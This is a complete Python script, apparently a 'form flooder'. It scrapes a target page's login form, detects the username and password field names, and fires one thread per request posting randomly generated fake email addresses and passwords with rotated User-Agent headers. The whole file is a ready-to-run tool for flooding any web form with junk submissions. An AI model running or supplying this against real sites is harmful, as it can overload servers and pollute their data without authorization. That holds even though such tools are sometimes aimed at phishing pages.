import requests, threading, random, string, names, time, sys, os
from bs4 import BeautifulSoup
from tqdm import tqdm

amount = int(input('Enter amount to flood: '))
url = input('Enter url: ')

r = requests.get(url)
soup = BeautifulSoup(r.content, features="html.parser")
form = soup.find('form')
post_fname = form['action']

def auto_gp():
	try:
		input1 = form.find('input', type='text')
		input2 = form.find('input', type='password')
		key1=input1['name']
		key2=input2['name']
	except:
		try:
			input1 = form.find('input', type='text')
			input2 = form.find('input', placeholder='Password')
			key1=input1['name']
			key2=input2['name']
		except:
			input1 = form.find('input', name='email')
			input2 = form.find('input', name='pass')
			key1=input1['name']
			key2=input2['name']

	return key1, key2

def get_param():
	try:
		print('trying to get key value automatically..')
		key1, key2 = auto_gp()
		print('[Success] ============>')
		print(f'     key1: {key1}\n     key2: {key2}')
		print('======================>')
	except:
		print('Error!, unable to get value automatically!,\n pls input it mannually')
		key1 = input('Email/User key value: ')
		key2 = input('Password key value: ')
	return key1, key2


def url_check(url):
	if(url[-1] == '/'):
		pass
	else:
		url+='/'
	return url

c=0
def flood(key1, key2):
	f = open('user_headers.txt','r').read().splitlines()
	x = ''.join(random.choices(f))
	header = {"User-Agent": x}
	rmail = names.get_full_name().replace(' ','')+'@gmail.com'
	rpass = ''.join(random.choices(string.digits+string.ascii_letters,k=random.randint(8,14)))
	data = {key1:rmail,key2:rpass}
	r = requests.post(url+post_fname, headers=header,data=data)
	global c
	c+=1
	try:
		if sys.argv[1] == '-v':
			print(f'({c})[{r.status_code}] {data} | <{url+post_fname}>')
	except:
		pass
"""
	if os.path.exists('ninja.dat'):
		pass
	else:
		x=open('ninja.dat','w')
		x.write('owo')
		x.close()
		ui = input("Do you want to add additional keys? (y/N)").lower()
		if ui == 'y':
			ui = input('How many keys? pls int value: ')
			for i in range(int(ui)):
				nkey = input('Enter Key: ')
				nvalue = input('Enter Value: ')
				data2 = dict(key=nvalue)
				data.update(data2)
				print('done!')"""

def loading(amount):
	try:
		if sys.argv[1] == '-v':
			pass
	except:
		for i in tqdm(range(0, int(amount)), desc='Flooding'):
			time.sleep(.1)


if __name__ == "__main__":
	if os.path.exists('ninja.dat'):
		os.remove('ninja.dat')
	key1, key2 = get_param()
	url = url_check(url)
	threads = []
	threading.Thread(target=loading, args=[amount]).start()
	for i in range(amount):
		x = threading.Thread(target=flood, args=[key1, key2])
		x.daemon = True
		threads.append(x)

	for i in range(amount):
		threads[i].start()

	for i in range(amount):
		threads[i].join()
